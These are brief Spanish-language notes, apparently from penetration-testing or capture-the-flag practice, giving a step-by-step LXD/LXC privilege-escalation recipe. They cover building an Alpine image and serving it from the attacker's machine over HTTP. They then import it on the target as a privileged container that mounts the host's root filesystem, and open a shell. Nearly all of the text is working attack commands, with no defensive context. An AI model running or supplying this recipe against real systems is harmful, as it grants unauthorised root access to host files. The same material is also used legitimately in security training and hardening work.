**LXC (Linux Containers)** es una tecnología de **virtualización a nivel de sistema operativo**.
NOTA: se uso para copiar todo lo que estaba en / y dejarlo en /mnt/root
https://www.exploit-db.com/exploits/46978

1.- descargar en equipo personal
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine 

2.- generar archivo .tar y levantamos un servidor para descargar en el atacante
sudo bash build-alpine
alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
sudo python3 -m http.server

3.- descargamos y buildeamos
- lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
- lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Sep 10, 2023 at 4:15pm (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
-  lxc init myimage ignite -c security.privileged=true
- lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
- lxc start ignite
- lxc exec ignite /bin/sh
lxc exec ignite /bin/sh